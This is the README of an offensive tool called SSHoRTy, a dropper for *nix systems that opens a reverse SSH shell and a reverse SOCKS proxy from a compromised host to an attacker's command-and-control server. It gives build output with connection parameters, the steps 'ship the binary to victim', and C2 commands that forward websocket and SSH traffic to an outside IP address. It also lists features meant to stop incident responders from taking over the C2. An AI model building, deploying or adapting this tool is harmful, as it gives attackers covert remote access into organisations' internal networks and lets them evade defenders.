
# SSHoRTy

A standalone SSH Reverse shell tunnel and Reverse SOCKS Proxy Dropper for *nix systems. 
```bash
 [Organization]  ----- |Internet| ------ [Attacker C2]
 
      (Dropper)  ------ Call back ------> SSH Server -------------------|
                                                                        |  Attacker SSH shell client             
 1. Internal Host <==== SSH Client <= Reverse Shell ==== SSH Server ----|
                                                                        |  Attacker Browser+SOCKS
 2. Internal Hosts N <==== SSH Client <= Reverse SOCKS ==== SSH Server -|
    Internal Hosts N+1

```
## Features

- Full PTY support, the "real" shell
- end-to-end SSH w/key equivalency
- RSA key can be hosted offsite and fetched for operation. It is Additionally encrypted with AES in flight 
- Reverse SSH is protected on atatcker side with an additional password to avoid hijacking connections.
- Ability to protect from C2 takeover from DFIR by authorized_keys options 

Note: No SCP yet. No DNS proxying yet.

## Deployment 

Build Dropper 

`./build.sh`

```bash
[*] Building dropper
[*] Dropper Information (keep it safe):
    #######################
    Dropper File: rssh (7010788 bytes)
    SSH serverHost=192.168.88.15
    SSH serverPort=22
    SSH serverUser=tester
    SSH serverUserKeyUrl=http://127.0.0.1:9000/id_rsa_test_enc
    SSH serverUserKeyPassphrase=password1
    SSH-RT remoteCmdHost=127.0.0.1
    SSH-RT remoteCmdPort=2022
    SSH-RT remoteCmdUser=operator
    SSH-RT remoteCmdPwd=6009c967f7176e5be0bb14d5b2beb0a8905a069f
    SSH-RTS remoteSocksHost=127.0.0.1
    SSH-RTS remoteSocksPort=1080
    SSH-RT shell agent password: 6009c967f7176e5be0bb14d5b2beb0a8905a069f 
    #######################

       Usage SSH-RT: ssh operator@127.0.0.1 -p 2022 
       Usage SSH-RTS: browser SOCKS proxy: 127.0.0.1:1080 

```
1. Host dropper RSA keys on HTTP server (fetchable by URL from Company Intranet)
2. Allow SSH on C2 
3. Ship the binary to victim


## Operation

```bash
       SSH from Attacker C2: ssh operator@127.0.0.1 -p 2022 
       
       SOCKS from Attacker C2 SOCKS proxy: 127.0.0.1:1080 
       point your browser to it and/or proxifier. Note: no DNS masking yet.
```

## C2:

Unwrap websocket and forward to SSH port
```bash
./websockify.py --ssl-only  --cert=/Users/dimas/Code/go/src/sshpipe/websocketd/sslcert.pem --key=/Users/dimas/Code/go/src/sshpipe/websocketd/sslkey.pem 8080 167.99.88.24:22
``` 

Local SSH tunnel to proxy host in the background 
``` 
ssh  -N -f -q  -L 127.0.0.1:1080:127.0.0.1:1080 root@167.99.88.24
``` 
## Code used
Thanks to ref: 
- https://gist.github.com/codref/473351a24a3ef90162cf10857fac0ff3
-	 https://gist.github.com/pavel-odintsov/0208f1848952d4940b4a5976165db17f
-	 https://github.com/creack/termios/blob/master/win/win.go
-	 https://github.com/davecheney/socksie
-	 https://sosedoff.com/2015/05/25/ssh-port-forwarding-with-go.html
- https://raw.githubusercontent.com/Scalingo/go-ssh-examples/master/server_complex.go

